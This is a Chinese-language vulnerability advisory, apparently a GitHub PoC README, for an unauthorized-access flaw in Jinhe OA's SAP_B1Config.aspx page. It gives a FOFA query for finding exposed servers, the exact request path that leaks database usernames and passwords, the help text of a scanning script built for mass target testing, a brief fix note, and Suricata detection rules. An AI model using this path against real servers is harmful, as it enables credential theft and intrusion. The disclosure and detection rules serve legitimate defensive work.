### 产品简介  
金和网络是专业信息化服务商，为城市监管部门提供了互联网+监管解决方案，为企事业单位提供组织协同OA系统升开发平台，电子政务一体化平台智慧电商平合等服务.  

### 漏洞概述  
金和OA SAP_B1Config.aspx存在未授权访问漏洞，攻击者可通过此漏洞获取数据库的账户密码等敏感信息。  

### 指纹识别  
fofa: app="金和网络-金和OA"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_OA_SAP_B1Config_unauthorized/1.png)

### 漏洞利用  
```
poc:
/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1
```

![Image text](https://github.com/YUUKI4O4/POC/blob/main/Jinhe_OA_SAP_B1Config_unauthorized/2.png)

### 测试和利用脚本  
```
python3 Jinhe_OA_SAP_B1Config_unauthorized.py -h          
usage: Jinhe_OA_SAP_B1Config_unauthorized.py [-h] [-t] [-r FILE] [-u URL]

### Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Jinhe_OA_SAP_B1Config_unauthorized.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Jinhe_OA_SAP_B1Config_unauthorized.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability"; flow:established,to_server; flowbits:set,Jinhe_OA_SAP_B1Config_unauthorized;noalert; content:"get";http_method;nocase; content:"/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1";http_uri;fast_pattern;nocase; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:7; rev:1;)
alert http any any -> any any (msg:"Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability successfully"; flow:established,from_server; flowbits:isset,Jinhe_OA_SAP_B1Config_unauthorized; content:"200";http_stat_code; content:"txtDatabaseServer";nocase;http_server_body; content:"txtLicenseServer";nocase;http_server_body; content:"txtDatabaseName";nocase;http_server_body; content:"ddlDatabaseType";nocase;http_server_body; content:"txtUserName";nocase;http_server_body; content:"txtUserPassword";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Jinhe_OA_SAP_B1Config_unauthorized; classtype:web-attck; metadata:created_at 2024-1-8,updated_at 2024-1-8,creater:YUUKI4O4; sid:8; rev:1;)
```
